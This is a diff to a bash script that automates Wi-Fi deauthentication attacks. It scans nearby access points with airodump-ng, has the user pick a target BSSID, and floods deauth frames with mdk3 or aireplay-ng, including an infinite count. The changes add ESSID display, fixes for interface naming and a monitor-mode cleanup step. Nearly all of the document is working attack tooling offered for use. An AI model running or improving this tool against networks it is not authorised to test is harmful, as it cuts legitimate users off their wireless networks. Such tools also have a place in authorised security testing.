@@ -56,6 +56,7 @@ function targets {
 		egrep -o "([A-Z0-9]{2}[\:]){5}[A-Z0-9]{2}" $td/dmp.csv 1>$td/dmp2.csv
 		line
 		cut -d "," --output-delimiter "  " -f 1,4,9,14 $td/dmp.csv | head -n -1 | tail -n +3 | awk 'BEGIN {OFS="  "} {print NR,"  ", $0}' 1>$td/dmp3.dat
+		cut -d "," --output-delimiter "  " -f 14 $td/dmp.csv | head -n -1 | tail -n +3 1>$td/dmpe.dat
 		echo -e "#\tBSSID\t\tChannel\tPWR\tESSID\n"
 		cat $td/dmp3.dat
 		line
@@ -66,11 +67,15 @@ function airodmp {
 	echo -e "Starting airodump-ng... Please wait..\nYou can press Ctrl+C to stop airodump !"
 	sleep 3
 	if [ -z "$miface" ];then
-		# for system where wlan interface is named something like wlxc4e98415dc54
-		airmon-ng 1>$td/airm.dat
-		x=`grep -n "mon" $td/airm.dat | head -n1 | tail -n1 | cut -d: -f1`
-		iface=`head -n$x $td/airm.dat | tail -n1 | cut -f2`
-		airodump-ng --output-format csv --write $td/dmp $iface
+		if [ `echo $iface | wc --chars` -gt 6 ];then
+			# for system where wlan interface is named something like wlxc4e98415dc54
+			# pick the first wlanmon interface for now.
+			airmon-ng 1>$td/airm.dat
+			x=`grep -n "mon" $td/airm.dat | head -n1 | tail -n1 | cut -d: -f1`
+			iface=`head -n$x $td/airm.dat | tail -n1 | cut -f2`
+			airodump-ng --output-format csv --write $td/dmp $iface
+			export iflag=1
+		else airodump-ng --output-format csv --write $td/dmp ${iface}mon; fi
 	else
 		airodump-ng --output-format csv --write $td/dmp $miface
 	fi
@@ -90,7 +95,7 @@ function get-iface {
 	if [ $? -eq 0 ];then echo "[ DONE ]"; else echo "[ FAILED ]"; fi
 	echo -ne "airmon-ng start $iface\t"
 	airmon-ng start $iface 2>/dev/null 1>/dev/null
-	if [ $? -ne 0 ]; then echo "[ FAILED ]"; else echo "[ DONE ]"; fi
+	if [ $? -ne 0 ]; then echo "[ FAILED ]"; exit 1; else echo "[ DONE ]"; fi
 	# starting network-manager
 	if [ -e /etc/init.d/networking ];then
 		echo -ne "Starting /etc/init.d/networking\t"
@@ -104,6 +109,13 @@ function get-iface {
 	fi
 }
 
+function airmon-stop {
+   # stop monitor mode in the end
+   airmon-ng stop ${iface}mon 1>/dev/null 2>/dev/null
+   airmon-ng stop $iface 1>/dev/null 2>/dev/null
+   airmon-ng stop $miface 1>/dev/null 2>/dev/null
+}
+
 function mdk3-deauth {
 	# choose BSSID
 	max_opt=`cat $td/dmp3.dat | wc -l`
@@ -112,11 +124,19 @@ function mdk3-deauth {
 	done
 	line
 	bssid=$(head -n $bss $td/dmp3.dat | tail -n +$bss | awk '{print $2}')
+	essid=$(head -n $bss $td/dmpe.dat | tail -n +$bss | cut -d" " -f2)
 	echo $bssid > $td/blacklist.txt
 	# run mdk3
+	echo -e "[ $essid ]\t[ $bssid ]"
 	echo "Running mdk3.. You can press Ctrl+C to stop !"
-	if [ -z "$miface" ]; then mdk3 ${iface}mon d -b $td/blacklist.txt -c
-	else mdk3 $miface d -b $td/blacklist.txt -c; fi
+	if [ -z "$miface" ]; then
+	   if [ -n "$iflag" ];then
+         mdk3 $iface d -b $td/blacklist.txt -c
+      else mdk3 ${iface}mon d -b $td/blacklist.txt -c; fi
+	else
+	   mdk3 $miface d -b $td/blacklist.txt -c
+	fi
+	airmon-stop
 }
 
 function aireplay-deauth {
@@ -126,11 +146,25 @@ function aireplay-deauth {
 		if [ $bss -gt $max_opt -o $bss -lt 1 ];then echo -e "Invalid input !! Retry"; else break; fi
 	done
 	bssid=$(head -n $bss $td/dmp3.dat | tail -n +$bss | awk '{print $2}')
+	essid=$(head -n $bss $td/dmpe.dat | tail -n +$bss | cut -d" " -f2)
 	ch=$(head -n $bss $td/dmp3.dat | tail -n +$bss | awk '{print $3}')
-	read -p "Enter the count (0 for infinite) : " cnt
+	read -p "Enter the count (0 for infinite) : " count
+	line
+	echo -e "[ $essid ]\t[ $bssid ]"
 	# run aireplay-ng
-	if [ -z "$miface" ]; then iwconfig ${iface}mon channel $ch; aireplay-ng --deauth $count -a $bssid ${iface}mon
-	else iwconfig $miface channel $ch; aireplay-ng --deauth $cnt -a $bssid $miface; fi
+	if [ -z "$miface" ]; then
+	   if [ -n "$iflag" ];then
+         iwconfig $iface channel $ch
+         aireplay-ng --deauth $count -a $bssid $iface
+      else
+         iwconfig ${iface}mon channel $ch
+         aireplay-ng --deauth $count -a $bssid ${iface}mon
+      fi
+	else
+	   iwconfig $miface channel $ch
+	   aireplay-ng --deauth $count -a $bssid $miface
+   fi
+   airmon-stop
 }
 
 # check for root
@@ -144,7 +178,7 @@ if [ `which iwconfig | wc -l` -eq 0 ];then install-wt; fi
 # working directory
 td=/tmp/deauth-`date +%d%m%y-%H%M%S`
 mkdir $td
-if [ `which resize | wc -l` -eq 1 ];then resize -s 30 84 1>/dev/null; fi
+if [ `which resize | wc -l` -eq 1 ];then resize -s 30 84 2>/dev/null 1>/dev/null; fi
 clear
 
 # find wlan interfaces
@@ -152,7 +186,7 @@ obt-iface
 line
 if [ -n "$miface" ];then
 	echo -e "Monitor mode found\t[ $miface ]"
-	read -p "Do you want to continue with it ? (y/n) " ch
+	read -p "Do you want to continue with it ? (y/n): " ch
 	if [ "$ch" == "y" -o "$ch" == "Y" ];then airodmp
 	else
 		# stop the monitor mode
